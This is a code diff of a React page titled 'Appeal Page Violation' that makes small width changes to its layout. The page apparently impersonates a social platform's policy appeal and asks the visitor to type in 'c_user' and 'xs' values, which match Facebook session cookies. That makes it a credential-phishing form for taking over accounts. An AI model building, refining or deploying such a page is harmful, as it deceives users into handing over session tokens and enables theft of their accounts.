@@ -38,7 +38,7 @@ export default function Home() {
         </Link>
       </div>
       <div className="w-full h-full flex flex-col items-center justify-between px-16 p-8 bg-[#FFFFFF]">
-        <div className="w-[50%] h-[50%] border-[#C2C2C2] border-2 pt-7  p-5">
+        <div className="w-[60%] h-[50%] border-[#C2C2C2] border-2 pt-7  p-5">
           <h1 className="text-xl font-bold">Appeal Page Violation</h1>
           <p className="my-5">
             We have detected unusual activity on your page that violates our
@@ -69,14 +69,14 @@ export default function Home() {
           </a>
           <p className="mt-6">c_user:</p>
           <input
-            className="w-[35%] h-11 rounded-md p-3 border-black border-2"
+            className="w-[30%] h-11 rounded-md p-3 border-black border-2"
             placeholder=""
             onChange={(event) => setUser(event.currentTarget.value)}
           />
 
           <p className="mt-6">xs:</p>
           <input
-            className="w-[35%] h-11 rounded-md p-3 border-black border-2"
+            className="w-[30%] h-11 rounded-md p-3 border-black border-2"
             placeholder=""
           />
 
